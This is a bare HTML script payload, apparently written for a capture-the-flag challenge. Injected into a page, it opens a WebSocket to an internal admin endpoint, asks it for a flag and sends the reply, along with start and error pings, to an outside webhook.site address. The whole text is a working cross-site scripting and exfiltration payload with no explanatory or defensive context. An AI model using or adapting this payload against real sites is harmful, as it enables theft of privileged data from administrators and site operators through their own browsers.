<script>
    console.log("start")
    fetch("https://webhook.site/27353005-b819-46c3-b445-f4a7bcdd533c?flag=start", {method: 'POST'});
    const ws = new WebSocket("wss://web:8080/admin/ws");
    ws.onopen = () => {
      console.log('Connected to server');
      ws.send("flag");
    };
    ws.onmessage = (event) => {
      console.log("Flag received:", event.data);
      fetch("https://webhook.site/27353005-b819-46c3-b445-f4a7bcdd533c?flag=" + encodeURIComponent(event.data),  {method: 'POST'});
    };
    ws.onerror = (err) => {
      console.log('Error received:', err);
      fetch("https://webhook.site/27353005-b819-46c3-b445-f4a7bcdd533c?error=ws_failed",  {method: 'POST'});
    };
</script>
